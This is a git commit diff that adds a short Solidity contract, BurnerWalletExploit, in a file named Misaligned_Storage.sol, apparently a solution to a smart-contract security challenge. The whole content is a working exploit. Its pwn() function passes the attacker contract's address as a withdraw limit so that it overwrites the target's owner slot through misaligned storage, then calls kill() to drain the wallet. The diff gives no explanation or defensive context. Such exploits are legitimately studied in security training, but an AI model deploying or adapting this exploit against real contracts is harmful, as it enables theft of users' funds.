6c9ed81b8dac80fe3574e5ab04176c388bb5280d
alexursol2 <103754814+alexursol2@users.noreply.github.com>
2024-03-09 13:26:16 +0100

    Update Misaligned_Storage.sol

--- Security/Misaligned_Storage.sol
+++ Security/Misaligned_Storage.sol
@@ -1,1 +1,22 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.20;
 
+interface IBurnerWallet {
+    function setWithdrawLimit(uint256 limit) external;
+    function kill() external;
+}
+
+contract BurnerWalletExploit {
+    address public target;
+
+    constructor(address _target) {
+        target = _target;
+    }
+
+    function pwn() external {
+        // set owner to this contract
+        IBurnerWallet(target).setWithdrawLimit(uint256(uint160(address(this))));
+        // kill to drain wallet
+        IBurnerWallet(target).kill();
+    }
+}
